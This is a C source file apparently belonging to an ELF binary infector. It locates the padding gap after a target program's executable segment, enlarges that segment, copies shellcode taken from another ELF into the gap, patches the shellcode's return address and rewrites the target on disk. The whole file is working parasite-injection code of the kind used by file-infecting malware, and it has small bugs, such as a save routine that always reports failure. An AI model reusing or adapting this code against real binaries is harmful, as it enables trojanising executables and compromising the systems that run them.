#include "elffile.h"
#include <bits/stdint-uintn.h>
#include <elf.h>
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/user.h>

#define DEBUG
#define PRINT

static int shellcode_patch_ret_address(struct Shellcode *this, Elf64_Addr addr)
{
#ifdef PRINT
    printf("[!] Replacing return address of the shellcode\n");
#endif
#ifdef DEBUG
    for (int i = 0; i < this->m_shellcode_size; i++){
        printf("%x\t", this->m_shellcode[i]);
    }
#endif
    puts("......\n");
    for (int i = 0; i < this->m_shellcode_size; i++)
    {
        if(this->m_shellcode[i] == 0x34 && this->m_shellcode[i + 1] == 0x12){
            *((uint32_t *)((void *)(this->m_shellcode + i))) = addr;
            printf("\n..%x..\n", *((uint32_t *)((void *)(this->m_shellcode + i))));
#ifdef DEBUG
            for (int i = 0; i < this->m_shellcode_size; i++){
                printf("%x\t", this->m_shellcode[i]);
            }
#endif
            return 0;
        }
    }

    return -1;
}

/* make a copy of shellcode's text section */
static int shellcode_extract_section(Shellcode *this, int index)
{
    this->m_shellcode_size = (this->m_elf->m_shdr[index].       \
            sh_size + 8);
    this->m_shellcode = malloc(sizeof(uint8_t) * this->         \
            m_shellcode_size);
    if(this->m_shellcode == NULL){

#ifdef DEBUG
        fprintf(stderr, "[ERROR] memory allocation failed\n");
#endif
        return -1;
    }

    memset(this->m_shellcode, 0, this->m_shellcode_size);
    memcpy(this->m_shellcode, &this->m_elf->m_map[this->        \
            m_elf->m_shdr[index].sh_offset], this->m_elf->m_shdr\
            [index].sh_size);

    /* probably unmap elf `\()/` */
    this->m_elf->RemoveMap(this->m_elf);

    return 0;
}


static int target_save_file(Target *this)
{
#ifdef PRINT
    printf("[!] Saving target file back to disk...\n");
#endif
    /* removing file */
    if(remove(this->m_elf->m_filename) < 0)
        goto err;

    /* create a new file with the same name */
    int out = open(this->m_elf->m_filename, O_RDWR | O_CREAT  \
            | O_TRUNC, S_IRWXO | S_IRWXU | S_IRWXG);
    if(out < 0){
        goto err;
    }

    /* 
     * this part is critical so, make sure every byte is written
     * back to the new file
     */
    int size = this->m_elf->m_size;
    ssize_t written = 0;
    void *buffer = this->m_elf->m_map;

#ifdef PRINT
    printf("[!] Writing new target...\n");
#endif
    /* write to new file */
    while(size != 0 && (written = write(out, buffer, size))     \
        != 0){
        if(written == -1){
            if(errno == EINTR)
                continue;

#ifdef DEBUG
            fprintf(stderr, "[ERROR] Write failed\n");
#endif
            goto err;
        }

        size -= written;
        buffer += written;
    }
#ifdef PRINT
    printf("[!] finished writing. closing file...\n");
#endif
    close(out);
err:
    return -1;
}

/* insert shellcode into Target binary */
static void target_insert_shellcode(Target *this, Shellcode     \
        *shellcode)
{
#ifdef PRINT
    printf("[!] injecting shellcode at offset %lx\n", this->text_end);
#endif
    for(int i = 0; i < shellcode->m_shellcode_size; i++){
        this->m_elf->m_map[this->text_end + i] = shellcode->    \
            m_shellcode[i];
    }
#ifdef PRINT
    printf("[!] finished injecting.\n");
#endif
}

/* to adjust section headers and other offsets */
static void target_adjust_sections(Target *this, int parasite_size)
{
#ifdef PRINT
    printf("[!] Adjusting section information...");
#endif
    for(int i = 0; i < this->m_elf->m_ehdr->e_shnum; i++){

        /* 
         * if sh_addr + sh_size == parasite_addr, we are at 
         * .text section. since we havent modified section
         * header's values such as sh_size, we should do that
         * now
         */
        if(this->m_elf->m_shdr[i].sh_addr + this->m_elf->m_shdr \
                [i].sh_size == this->parasite_addr)
            this->m_elf->m_shdr[i].sh_size += parasite_size;
    }
#ifdef PRINT
    printf("[!] Finished adjusting section info\n");
#endif
}

/* find free space in target binary */
static int target_find_free_space(Target *this, int parasite_size)
{
#ifdef PRINT
    printf("[!] Searching for free space...\n");
#endif
    bool text_found = false;
    for(int i = 0;i < this->m_elf->m_ehdr->e_phnum; i++){
        if(this->m_elf->m_phdr[i].p_type == PT_LOAD && this->   \
            m_elf->m_phdr[i].p_flags == (PF_R | PF_X)){

#ifdef PRINT
            printf("[!] .text segment found at shdr index %d address \
                %lx offset %ld\n", i, this->m_elf->m_phdr[i].p_vaddr,  \
                this->m_elf->m_phdr[i].p_offset);
#endif
            this->text_filesize = this->m_elf->m_phdr[i].p_filesz;
            this->text_end = this->m_elf->m_phdr[i].p_offset +  \
                this->text_filesize;
            this->parasite_addr = this->m_elf->m_phdr[i].       \
                p_vaddr + this->text_filesize;
            /* resizing p_filesz and p_memsz */
            this->m_elf->m_phdr[i].p_filesz += parasite_size;
            this->m_elf->m_phdr[i].p_memsz += parasite_size;
            text_found = true;

#ifdef PRINT
            printf("[!] Parasite start at address %lx\n", this->parasite_addr);
            printf("[!] Parasite start at offset %ld\n", this->text_end);
#endif

        } else {
            if (this->m_elf->m_phdr[i].p_type == PT_LOAD && (   \
                    this->m_elf->m_phdr[i].p_offset - this->    \
                    text_end)>= parasite_size && text_found){
#ifdef PRINT
                printf("[!] .data segment found at index %d address %lx offset %ld\n",
                    i, this->m_elf->m_phdr[i].p_vaddr, this->m_elf->m_phdr[i]. p_offset);
#endif
                this->available_freespace = this->m_elf->m_phdr \
                    [i].p_offset - this->text_end;

#ifdef PRINT
                printf("[!] Segments found with a gap of %d\n",      \
                        this->available_freespace);
#endif
                text_found = false;
            }
        }
    }

    return 0;
}

static void elf_remove_map(Elf *this)
{
    munmap(this->m_map, this->m_size);
    this->m_map = NULL;
}

/* to get the .text section code from our shellcode */
static int elf_get_section_index_by_name(Elf *this, const char  \
        *section_name)
{
    /* first we have to parse shstrtab */
    Elf64_Shdr *section = &this->m_shdr[this->m_ehdr->e_shstrndx];
    char *shstrtab = (char *)&this->m_map[section->sh_offset];

    for(int i = 0; i < this->m_ehdr->e_shnum; i++){
        if(strcmp(&shstrtab[this->m_shdr[i].sh_name],            \
                    section_name) == 0){
#ifdef PRINT
            printf("[!] %s section found at index %d\n", section_name, i);
#endif
            return i;
        }
    }

    return -1;
}

static void elf_parse_headers(Elf *this)
{
    this->m_ehdr = (Elf64_Ehdr *) this->m_map;
    this->m_phdr = (Elf64_Phdr *) &this->m_map[this->m_ehdr->   \
        e_phoff];
    this->m_shdr = (Elf64_Shdr *) &this->m_map[this->m_ehdr->   \
        e_shoff];
}

static bool elf_is_elf(Elf *this)
{
    if(this->m_map == NULL){

#ifdef DEBUG
        fprintf(stderr, "[ERROR] File not mapped\n");
#endif
        goto err;
    }

    if(this->m_map[0] != 0x7f || this->m_map[1] != 'E' ||         \
        this->m_map[2] != 'L' || this->m_map[3] != 'F'){

#ifdef DEBUG
        fprintf(stderr, "[ERROR] Not an elf binary\n");
#endif
        goto err;
    }

    return true;

err:
    return false;
}

static int elf_init_file(Elf *this)
{
    if(this->m_filename == NULL){

#ifdef DEBUG
        fprintf(stderr, "[ERROR] Filename not specified\n");
#endif
        goto err;
    }

    int fd = open(this->m_filename, O_RDWR);
    if(fd < 0){
        goto err;
    }

    struct stat st;
    if(fstat(fd, &st) < 0){

#ifdef DEBUG
        fprintf(stderr, "[ERROR] fstat failed\n");
#endif
        goto err1;
    }

    this->m_size = st.st_size;
    this->m_map =mmap(NULL, this->m_size, PROT_READ |PROT_WRITE \
        , MAP_PRIVATE, fd, 0);
    if(this->m_map == MAP_FAILED){

#ifdef DEBUG
        fprintf(stderr, "[ERROR] memory map failed");
#endif
        goto err1;
    }

    close(fd);
    return 0;

err1:
    close(fd);

err:
    return -1;
}

Elf *ElfConstructor(const char *filename)
{
    Elf *elf = malloc(sizeof(Elf));
    if(elf == NULL){

#ifdef DEBUG
        fprintf(stderr, "[ERROR] memory allocation failed\n");
#endif
        goto err;
    }

    elf->m_filename = filename;
    elf->m_size = 0;
    elf->m_map = NULL;
    elf->m_ehdr = NULL;
    elf->m_phdr = NULL;
    elf->m_shdr = NULL;

    elf->InitFile = elf_init_file;
    elf->IsElf = elf_is_elf;
    elf->ParseHeaders = elf_parse_headers;
    elf->FindSectionIndexByName = elf_get_section_index_by_name;
    elf->RemoveMap = elf_remove_map;

err:
    return elf;
}

void ElfDestructor(Elf *this)
{
    if(this->m_map != NULL)
        this->RemoveMap(this);

    free(this);
}

Target *TargetConstructor(const char *filename)
{
    Target *target = malloc(sizeof(Target));
    if(target == NULL){

        fprintf(stderr, "memory allocation error\n");
        goto err;
    }

    target->m_elf = ElfConstructor(filename);
    if(target->m_elf == NULL){
        goto err1;
    }

    if(target->m_elf->InitFile(target->m_elf) < 0){
        goto err2;
    }

    if(target->m_elf->IsElf(target->m_elf) == false){
        goto err2;
    }

    target->m_elf->ParseHeaders(target->m_elf);
    target->TargetFindFreeSpace = target_find_free_space;
    target->TargetAdjustSections = target_adjust_sections;
    target->TargetInsertShellcode = target_insert_shellcode;
    target->TargetSaveFile = target_save_file;

    return target;

err2:
    ElfDestructor(target->m_elf);

err1:
    free(target);

err:
    return NULL;
}

void TargetDestructor(Target *this)
{
    ElfDestructor(this->m_elf);
    free(this);
}

Shellcode *ShellcodeConstructor(const char *filename)
{
    Shellcode *shellcode = malloc(sizeof(Shellcode));
    if(shellcode == NULL){

#ifdef DEBUG
        fprintf(stderr, "memory allocation error\n");
#endif
        goto err;
    }
    shellcode->m_elf = ElfConstructor(filename);
    if(shellcode->m_elf == NULL){
        goto err1;
    }

    if(shellcode->m_elf->InitFile(shellcode->m_elf) < 0){
        goto err2;
    }

    if(shellcode->m_elf->IsElf(shellcode->m_elf) == false){
        goto err2;
    }

    shellcode->m_elf->ParseHeaders(shellcode->m_elf);
    shellcode->ShellcodePatchRetAddress = shellcode_patch_ret_address;
    shellcode->ShellcodeExtractText = shellcode_extract_section;

#ifdef DEBUG
    printf("[!] Shellcode constructed\n");
#endif
    return shellcode;

err2:
    ElfDestructor(shellcode->m_elf);

err1:
    free(shellcode);

err:
    return NULL;
}

void ShellcodeDestructor(Shellcode *this)
{
    /* freeing copy of shellcode */
    free(this->m_shellcode);

    /* remove shellcode files */
    if(remove(this->m_elf->m_filename) < 0){

#ifdef DEBUG
        fprintf(stderr, "failed to remove file\n");
#endif
        goto err;
    }

    ElfDestructor(this->m_elf);
    free(this);

err:
    return;
}
